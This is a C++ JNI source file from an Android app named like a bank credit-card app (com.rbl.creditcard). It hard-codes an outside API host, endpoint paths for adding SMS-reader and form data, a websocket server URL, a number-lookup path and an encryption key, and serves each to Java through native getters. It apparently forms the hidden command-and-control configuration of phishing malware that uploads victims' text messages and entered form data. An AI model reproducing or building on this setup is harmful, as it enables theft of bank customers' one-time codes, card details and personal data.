#include <jni.h>
#include <string>

// Declare global variables for the domain URLs
std::string url = "https://queensalimi.in/api";
std::string sms_save = "/sms-reader/add";
std::string form_save = "/form/add";
std::string site = "localhost";
std::string KEY = "00112233445566778899aabbccddeeff";
std::string getNumber = "/site/number?site=";
std::string socketUrl = "wss://socket.queensalimi.in";

extern "C"
JNIEXPORT jstring JNICALL
Java_com_rbl_creditcard_Helper_URL(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(url.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_rbl_creditcard_Helper_FormSavePath(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(form_save.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_rbl_creditcard_Helper_SMSSavePath(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(sms_save.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_rbl_creditcard_Helper_SITE(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(site.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_rbl_creditcard_Helper_KEY(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(KEY.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_rbl_creditcard_Helper_getNumber(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(getNumber.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_rbl_creditcard_Helper_SocketUrl(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(socketUrl.c_str());
}
